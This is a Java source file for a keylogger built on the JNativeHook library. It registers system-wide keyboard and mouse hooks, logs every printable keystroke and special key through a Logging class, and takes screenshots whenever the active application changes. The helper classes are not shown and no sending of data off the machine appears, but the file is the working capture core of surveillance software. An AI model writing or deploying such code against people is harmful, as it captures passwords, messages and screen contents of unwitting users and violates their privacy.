import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

import javax.swing.*;
import java.io.IOException;

public class KeyLogger_main {

    static boolean enabled=true;
    //this state will check for activation and removal of GlobalScreen of JNH..
    //this class will be called by the Enable/Disable part of the API...

    public KeyLogger_main(boolean enabled) throws NativeHookException {
        this.enabled = enabled;
        if (enabled)  System.out.println("LOGGING STARTED!!");
        else {
            JOptionPane.showMessageDialog(null,"LOGGING STOPPED!!");
            return;
        }
    }

    void proceed_with_logging() {
        GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent e) {
            	take_a_screenshot(new ActiveApplication_Changed().ActiveApplicationChecker());
                keyPressed(e);
            }

            @Override
            public void nativeKeyReleased(NativeKeyEvent e) {}

            @Override
            public void nativeKeyTyped(NativeKeyEvent e) {
            	//System.out.println("Working");
            	take_a_screenshot(new ActiveApplication_Changed().ActiveApplicationChecker());
                keyTyped(e.getKeyChar());
            }
        });
        GlobalScreen.getInstance().addNativeMouseListener(new NativeMouseListener() {
            @Override
            public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
                take_a_screenshot(new ActiveApplication_Changed().ActiveApplicationChecker());
            }

            @Override
            public void nativeMousePressed(NativeMouseEvent nativeMouseEvent) {

            }

            @Override
            public void nativeMouseReleased(NativeMouseEvent nativeMouseEvent) {

            }
        });
    }

    static boolean flag=false;

    private void keyPressed(NativeKeyEvent e){

        if(enabled) {
            String keypressed = NativeKeyEvent.getKeyText(e.getKeyCode());
            //System.out.println("Key pressed : "+keypressed);
            if (keypressed.length() > 1) {
                if (keypressed.equals("Ctrl") || keypressed.equals("Alt") || keypressed.equals("Windows")) {
                    flag = true;
                    new Logging("[" + keypressed + "]");
                } else if (keypressed.equals("Tab") || keypressed.equals("Caps Lock") || keypressed.equals("Escape") || keypressed.startsWith("F") || keypressed.equals("Insert") || keypressed.equals("Print Screen") || keypressed.equals("Backspace") || keypressed.equals("Delete") || keypressed.equals("Home") || keypressed.equals("End") || keypressed.equals("Enter") || keypressed.equals("Up") || keypressed.equals("Down") || keypressed.equals("Left") || keypressed.equals("Right")) {
                    flag = false;
                    new Logging("[" + keypressed + "]");
                }
            } else {
                if (flag) {
                    new Logging(keypressed);
                    flag = false;
                }
            }
        }
    }

    private void keyTyped(char key) {
        if(enabled) {
            int a = key;
            if(a>=32 && a<=126) {
                System.out.println("Logging it up with key typed being : " + key);
                new Logging(Character.toString(key));
            }
        }
    }
    
    
    public void take_a_screenshot(boolean flag)
    {
    	boolean screenShotflag = flag;
        if(screenShotflag) {
            //means that the active application has changed...
            //System.out.println("Saving screenshots because the active application changed");
            try {
                new saveScreenshot();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

}